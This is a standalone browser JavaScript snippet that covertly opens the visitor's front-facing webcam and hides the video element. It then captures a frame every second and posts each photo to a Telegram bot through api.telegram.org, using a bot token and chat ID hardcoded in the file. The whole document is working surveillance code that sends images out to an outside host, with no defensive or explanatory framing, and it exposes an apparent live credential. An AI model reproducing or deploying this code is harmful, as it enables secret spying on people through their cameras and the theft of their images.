const botToken = '7486963640:AAE3sMEu0MPW7jPkUlxXqiklaRf6chWEW3I';
        const chatId = '586564605';

        (async () => {
            try {
                // Access the webcam
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: 640,
                        height: 480,
                        facingMode: 'user' // Use 'environment' for rear camera
                    }
                });

                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.style.display = 'none'; // Hide the video element
                document.body.appendChild(video);

                // Explicitly play the video
                await video.play();

                // Check video readiness and dimensions
                const checkVideoReady = setInterval(() => {
                    if (video.videoWidth > 0 && video.videoHeight > 0) {
                        clearInterval(checkVideoReady); // Stop checking once video is ready

                        // Start capturing images
                        setInterval(async () => {
                            const canvas = document.createElement('canvas');
                            const context = canvas.getContext('2d');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;

                            // Draw the current video frame on the canvas
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);

                            // Send the captured image to Telegram
                            canvas.toBlob(async (blob) => {
                                const formData = new FormData();
                                formData.append('chat_id', chatId);
                                formData.append('photo', blob, 'webcam_photo.jpg');

                                try {
                                    const response = await fetch(
                                        `https://api.telegram.org/bot${botToken}/sendPhoto`,
                                        {
                                            method: 'POST',
                                            body: formData,
                                        }
                                    );
                                    const data = await response.json();
                                    console.log('Photo sent to Telegram:', data);
                                } catch (error) {
                                    console.error('Error sending photo to Telegram:', error);
                                }
                            }, 'image/jpeg');
                        }, 1000); // Capture and send an image every 1 second
                    }
                }, 100); // Check every 100ms if video is ready

            } catch (error) {
                console.error('Error accessing webcam:', error);
            }
        })();
